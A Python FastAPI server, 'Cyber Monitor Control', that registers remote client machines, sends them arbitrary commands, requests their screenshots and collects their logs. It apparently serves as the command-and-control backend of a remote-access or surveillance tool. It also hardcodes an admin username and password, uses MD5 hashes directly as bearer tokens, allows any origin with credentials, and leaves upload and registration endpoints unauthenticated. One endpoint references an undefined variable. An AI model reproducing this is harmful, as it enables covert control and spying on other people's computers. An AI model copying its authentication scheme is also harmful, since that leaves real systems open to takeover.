from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import List, Dict, Optional
import uvicorn
import hashlib
import base64
import asyncio
from datetime import datetime, timedelta
from supabase import create_client, Client
import json
import os
from dotenv import load_dotenv
import logging

# Load environment
load_dotenv()

# ========== CONFIGURATION ==========
app = FastAPI(title="Cyber Monitor Control", version="2.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Supabase
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Security
security = HTTPBearer()
ADMIN_PASSWORD_HASH = hashlib.md5("40671Mps19*".encode()).hexdigest()

# ========== MODELS ==========
class LoginRequest(BaseModel):
    email: str
    password: str

class ClientRegister(BaseModel):
    client_id: str
    name: str
    ip_address: str
    os_info: str = "Windows"

class CommandRequest(BaseModel):
    client_id: str
    command: str
    parameters: Dict = {}

class ScreenshotResponse(BaseModel):
    success: bool
    image_data: Optional[str] = None
    message: Optional[str] = None

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.client_connections: Dict[str, WebSocket] = {}

    async def connect_admin(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.active_connections[client_id] = websocket

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket

    def disconnect(self, client_id: str):
        if client_id in self.active_connections:
            del self.active_connections[client_id]
        if client_id in self.client_connections:
            del self.client_connections[client_id]

    async def send_to_admin(self, client_id: str, message: dict):
        if client_id in self.active_connections:
            await self.active_connections[client_id].send_json(message)

    async def send_to_client(self, client_id: str, message: dict):
        if client_id in self.client_connections:
            await self.client_connections[client_id].send_json(message)

manager = ConnectionManager()

# ========== AUTH FUNCTIONS ==========
def verify_password(password: str, stored_hash: str) -> bool:
    return hashlib.md5(password.encode()).hexdigest() == stored_hash

async def authenticate_admin(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    # Verify token (simplified - implement JWT in production)
    if token != ADMIN_PASSWORD_HASH:
        raise HTTPException(status_code=401, detail="Invalid token")
    return {"user": "admin"}

# ========== ROUTES ==========
@app.post("/api/login")
async def login(data: LoginRequest):
    try:
        # Check admin credentials
        if data.email == "xotiic" and verify_password(data.password, ADMIN_PASSWORD_HASH):
            return {
                "success": True,
                "token": ADMIN_PASSWORD_HASH,
                "user": {"email": data.email, "is_admin": True}
            }
        
        # Check Supabase users
        response = supabase.table("users").select("*").eq("email", data.email).execute()
        if response.data and verify_password(data.password, response.data[0]["password_hash"]):
            return {
                "success": True,
                "token": response.data[0]["password_hash"],
                "user": response.data[0]
            }
        
        raise HTTPException(status_code=401, detail="Invalid credentials")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/register-client")
async def register_client(data: ClientRegister):
    try:
        # Check if client exists
        response = supabase.table("clients").select("*").eq("client_id", data.client_id).execute()
        
        if response.data:
            # Update existing client
            supabase.table("clients").update({
                "last_seen": datetime.utcnow().isoformat(),
                "online": True,
                "ip_address": data.ip_address,
                "os_info": data.os_info
            }).eq("client_id", data.client_id).execute()
        else:
            # Create new client
            supabase.table("clients").insert({
                "client_id": data.client_id,
                "name": data.name,
                "ip_address": data.ip_address,
                "os_info": data.os_info,
                "last_seen": datetime.utcnow().isoformat(),
                "online": True
            }).execute()
        
        return {"success": True, "message": "Client registered"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/clients")
async def get_clients(_: dict = Depends(authenticate_admin)):
    try:
        response = supabase.table("clients").select("*").order("last_seen", desc=True).execute()
        return {"success": True, "clients": response.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/client/{client_id}")
async def get_client(client_id: str, _: dict = Depends(authenticate_admin)):
    try:
        # Get client info
        client_res = supabase.table("clients").select("*").eq("client_id", client_id).execute()
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Get recent logs
        logs_res = supabase.table("logs").select("*").eq("client_id", client_res.data[0]["id"]).order("created_at", desc=True).limit(50).execute()
        
        # Get recent commands
        commands_res = supabase.table("commands").select("*").eq("client_id", client_res.data[0]["id"]).order("created_at", desc=True).limit(20).execute()
        
        # Get recent screenshots
        screenshots_res = supabase.table("screenshots").select("*").eq("client_id", client_res.data[0]["id"]).order("created_at", desc=True).limit(10).execute()
        
        return {
            "success": True,
            "client": client_res.data[0],
            "logs": logs_res.data,
            "commands": commands_res.data,
            "screenshots": screenshots_res.data
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command")
async def send_command(data: CommandRequest, _: dict = Depends(authenticate_admin)):
    try:
        # Get client ID from client_id string
        client_res = supabase.table("clients").select("id").eq("client_id", data.client_id).execute()
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_res = supabase.table("commands").insert({
            "client_id": client_res.data[0]["id"],
            "command": data.command,
            "status": "pending",
            "parameters": json.dumps(data.parameters)
        }).execute()
        
        # Try to send via WebSocket
        await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_res.data[0]["id"],
            "command": data.command,
            "parameters": data.parameters
        })
        
        return {"success": True, "command_id": command_res.data[0]["id"]}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Add these imports
from fastapi import Query
import base64

# Add these new endpoints to your main.py
@app.get("/api/commands")
async def get_commands(
    _: dict = Depends(authenticate_admin),
    limit: int = Query(50, ge=1, le=100)
):
    """Get recent commands"""
    try:
        response = supabase.table("commands")\
            .select("*, clients(client_id)")\
            .order("created_at", desc=True)\
            .limit(limit)\
            .execute()
        return {"success": True, "commands": response.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/screenshots")
async def get_screenshots(
    _: dict = Depends(authenticate_admin),
    limit: int = Query(10, ge=1, le=50)
):
    """Get recent screenshots"""
    try:
        response = supabase.table("screenshots")\
            .select("*, clients(client_id)")\
            .order("created_at", desc=True)\
            .limit(limit)\
            .execute()
        return {"success": True, "screenshots": response.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs")
async def get_logs(
    _: dict = Depends(authenticate_admin),
    client_id: Optional[str] = None,
    limit: int = Query(100, ge=1, le=500)
):
    """Get system logs"""
    try:
        query = supabase.table("logs")\
            .select("*, clients(client_id)")\
            .order("created_at", desc=True)\
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients")\
                .select("id")\
                .eq("client_id", client_id)\
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "logs": response.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ws-url")
async def get_websocket_url(_: dict = Depends(authenticate_admin)):
    """Get WebSocket URL for frontend"""
    base_url = str(request.base_url).replace("http://", "ws://").replace("https://", "wss://")
    return {"ws_url": f"{base_url}ws/admin"}

@app.post("/api/screenshot/{client_id}")
async def request_screenshot(client_id: str, _: dict = Depends(authenticate_admin)):
    try:
        # Send screenshot request via WebSocket
        await manager.send_to_client(client_id, {
            "type": "screenshot_request"
        })
        
        return {"success": True, "message": "Screenshot request sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-screenshot")
async def upload_screenshot(client_id: str, image_data: str = None):
    try:
        if not image_data:
            raise HTTPException(status_code=400, detail="No image data provided")
        
        # Get client ID
        client_res = supabase.table("clients").select("id").eq("client_id", client_id).execute()
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Store screenshot
        supabase.table("screenshots").insert({
            "client_id": client_res.data[0]["id"],
            "image_data": image_data
        }).execute()
        
        # Notify admin via WebSocket
        await manager.send_to_admin("admin", {
            "type": "screenshot_received",
            "client_id": client_id,
            "image_data": image_data[:100] + "..."  # Preview only
        })
        
        return {"success": True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    await manager.connect_admin(websocket, "admin")
    try:
        while True:
            data = await websocket.receive_json()
            # Handle admin commands
    except WebSocketDisconnect:
        manager.disconnect("admin")

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await manager.connect_client(websocket, client_id)
    try:
        while True:
            data = await websocket.receive_json()
            
            if data.get("type") == "heartbeat":
                # Update client online status
                supabase.table("clients").update({
                    "last_seen": datetime.utcnow().isoformat(),
                    "online": True
                }).eq("client_id", client_id).execute()
                
            elif data.get("type") == "command_result":
                # Update command status
                supabase.table("commands").update({
                    "status": "completed",
                    "result": json.dumps(data.get("result"))
                }).eq("id", data.get("command_id")).execute()
                
            elif data.get("type") == "log":
                # Store log
                client_res = supabase.table("clients").select("id").eq("client_id", client_id).execute()
                if client_res.data:
                    supabase.table("logs").insert({
                        "client_id": client_res.data[0]["id"],
                        "log_type": data.get("log_type", "info"),
                        "message": data.get("message")
                    }).execute()
                    
    except WebSocketDisconnect:
        # Mark client as offline
        supabase.table("clients").update({
            "online": False
        }).eq("client_id", client_id).execute()
        manager.disconnect(client_id)

@app.get("/")
async def root():
    return {"message": "Cyber Monitor Control API", "version": "2.0"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)